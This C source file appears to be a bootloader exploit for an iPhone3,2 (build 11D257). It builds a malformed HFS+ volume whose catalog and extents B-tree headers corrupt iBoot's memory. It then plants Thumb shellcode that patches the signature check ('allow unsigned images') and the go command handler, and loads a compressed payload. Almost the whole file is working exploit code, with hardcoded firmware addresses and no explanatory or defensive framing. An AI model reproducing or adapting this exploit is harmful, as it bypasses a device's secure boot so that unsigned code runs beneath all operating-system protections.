// iPhone3,2 11D257
// boot-path = "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/disk.dmg"

#define IMAGE_START             0x5FF00000
#define IMAGE_END               0x5FF50004
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA6FFC
#define IMAGE_BSS_START         0x5FF41640
#define IMAGE_TEXT_END          0x5FF41000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000
#define IMAGE_LOADADDR          0x40000000
#define IMAGE_HUGECHUNK         0x3000000
#define IMAGE_JUMPADDR          0x44000000

#define breakpoint1_ADDR        (0x178C4 + 1) /* ResolvePathToCatalogEntry */


#define fuck1_ADDR              (0x18726 + 1)
/* where the bins addr gets loaded */
#define fuck2_ADDR              (0x1873C + 1)
/* after we skipped the zeros */
#define fuck3_ADDR              (0x18852 + 1)
/* return block */

#define wait_for_event_ADDR     (0x00814)
#define hugechunk_ADDR          (0x00CAE + 1)
#define gpio_pin_state_ADDR     (0x02694 + 1)
#define gpio_set_state_ADDR     (0x026BC + 1)
#define get_timer_us_ADDR       (0x094DC + 1)
#define reset_cpu_ADDR          (0x095A0 + 1)
#define readp_ADDR              (0x184EC + 1)
#define get_mem_size_ADDR       (0x14D14 + 1)
#define putchar_ADDR            (0x31B78 + 1)
#define adjust_stack_ADDR       (0x1D6E0 + 1)
#define adjust_environ_ADDR     (0x1DB14 + 1)
#define disable_interrupts_ADDR (0x32884 + 1)
#define cache_stuff_ADDR        (0x20300 + 1)

#define wtf_ADDR                (0x094D6) /* ??? */

#define iboot_warmup_ADDR       (0x00110)
#define iboot_start_ADDR        (0x00BD0 + 1)
#define main_task_ADDR          (0x00C3C + 1)
#define panic_ADDR              (0x1E928 + 1)
#define system_init_ADDR        (0x1EA14 + 1)
#define task_create_ADDR        (0x1F044 + 1)
#define task_start_ADDR         (0x1F1A4 + 1)
#define task_exit_ADDR          (0x1F1C8 + 1)
#define printf_ADDR             (0x313E0 + 1)
#define malloc_ADDR             (0x18508 + 1)
#define free_ADDR               (0x185BC + 1)
#define create_envvar_ADDR      (0x16E2C + 1)
#define bcopy_ADDR              (0x31E64)
#define decompress_lzss_ADDR    (0x23260 + 1)

#define memalign_ADDR           (0x186E4 + 1)
#define BINS_ADDR               (0x447A0 + 0x28)
#define BINS_LEN                (0x20 * 0x4)

#define NODE_SIZE (0x2000) /* also 0x1000 is working */
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)

#define TREEDEPTH 1 /* +4? for recursion */
#define TRYFIRST 0 /* working, but not gud */
#define TRYLAST 0 /* not working */

#define START_OF_BTREE_HEADER 0x44594
#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x2C) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)

void patch_header(void **buffer){
    PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);  /* HFSPlusVolumeHeader::catalogFile.logicalSize */
    PUT_QWORD_BE(buffer,  0xC0, EXTENT_SIZE);           /* HFSPlusVolumeHeader::extentsFile.logicalSize */
}

void patch_catalog(void **buffer, void *nettoyeur, size_t nettoyeur_sz){
    memset(buffer, 'E', 14);
    memset((char *)buffer + 20, 'E', 256 - 20);
#if TREEDEPTH
    PUT_WORD_BE(buffer, 14, 3);                         /* BTHeaderRec::treeDepth */
#elif TRYLAST
    PUT_WORD_BE(buffer, 14, 2);                         /* BTHeaderRec::treeDepth */
#endif
    PUT_WORD_BE(buffer, 32, 512);                       /* BTHeaderRec::nodeSize */
    PUT_DWORD_BE(buffer, 36, 0x7FFFFF);                 /* BTHeaderRec::totalNodes */
#if TRYFIRST
    PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));     /* BTHeaderRec::rootNode (trigger) */
#else
    //PUT_DWORD_BE(buffer, 16, 3);                      /* BTHeaderRec::rootNode */
#endif
    
    memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
}

#if 0
#define TMP (uintptr_t)0x500000
#else
#define TMP IMAGE_START
#endif

void patch_extents(void **buffer, void *nettoyeur, size_t nettoyeur_sz){
    memset(buffer, 'F', 0x100);
    if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
    PUT_WORD_BE(buffer, 32, NODE_SIZE);                 /* BTHeaderRec::nodeSize */
    PUT_DWORD_BE(buffer, 36, TOTAL_NODES);              /* BTHeaderRec::totalNodes */
    PUT_DWORD_BE(buffer, 16, 0x500);                    /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
    PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
    PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
    
    PUT_DWORD_LE(buffer, 78, TMP + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
    
    PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
    
    PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, TMP + START_OF_SHELLCODE + 1);    /* r10 (code exec) */
    PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, TMP + 0x447FC);    /* r11 -> lr */

    /* SHEELCODE */
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   4 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE +  4, disable_interrupts_ADDR - 1));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +   8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(4, 68));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  10 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 72));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  12 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(1, 4));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  14 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 72));
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  16 - START_OF_EXTENTS_BTREE_HEADER, make_bl(1, START_OF_SHELLCODE + 16, bcopy_ADDR));
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  20 - START_OF_EXTENTS_BTREE_HEADER, INSNW_MOV_R1_2400);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  24 - START_OF_EXTENTS_BTREE_HEADER, INSNW_STRH_R1_R4_E2C);
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  28 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  30 - START_OF_EXTENTS_BTREE_HEADER, INSNW_MOV_R1_40000000);
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  34 - START_OF_EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  36 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 56));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  38 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(1, 60));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  40 - START_OF_EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  42 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  44 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(1, 0xFC));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  46 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 60));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  48 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(3, nettoyeur_sz));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  50 - START_OF_EXTENTS_BTREE_HEADER, INSNT_PUSH_R0);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  52 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE + 52, decompress_lzss_ADDR - 1));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  56 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 52));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  58 - START_OF_EXTENTS_BTREE_HEADER, INSNT_BLX_R(0));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  60 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(14, 4));
    PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  62 - START_OF_EXTENTS_BTREE_HEADER, INSNT_POP_PC);
    
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  76 - START_OF_EXTENTS_BTREE_HEADER, TMP + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  80 - START_OF_EXTENTS_BTREE_HEADER, IMAGE_JUMPADDR /* 0x44000000 */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  84 - START_OF_EXTENTS_BTREE_HEADER, TMP /* 0x5ff00000 */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  88 - START_OF_EXTENTS_BTREE_HEADER, IMAGE_BSS_START - IMAGE_START);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  92 - START_OF_EXTENTS_BTREE_HEADER, 0x3F378 /* go command handler */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 100 - START_OF_EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, TMP + 0x48000 /* nettoyeur uncompressed */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, TMP + 0x445BC /* nettoyeur compressed */);
    PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, TMP + wtf_ADDR);
    //<-- last instruction is TODO
    /* END */
}

#if 1
#define XLAT(addr)    (TMP + addr - IMAGE_START)

void patch_nettoyeur(unsigned int **nettoyeur) {
    *(*nettoyeur + (0x9C >> 2)) = TMP + *(*nettoyeur + (0x9C >> 2)) - (IMAGE_LOADADDR + 0x4000000);
    *(*nettoyeur + (0xA0 >> 2)) = XLAT(*(*nettoyeur + (0xA0 >> 2)));
    *(*nettoyeur + (0xA4 >> 2)) = XLAT(*(*nettoyeur + (0xA4 >> 2)));
    *(*nettoyeur + (0xA8 >> 2)) = XLAT(*(*nettoyeur + (0xA8 >> 2)));
}
#endif
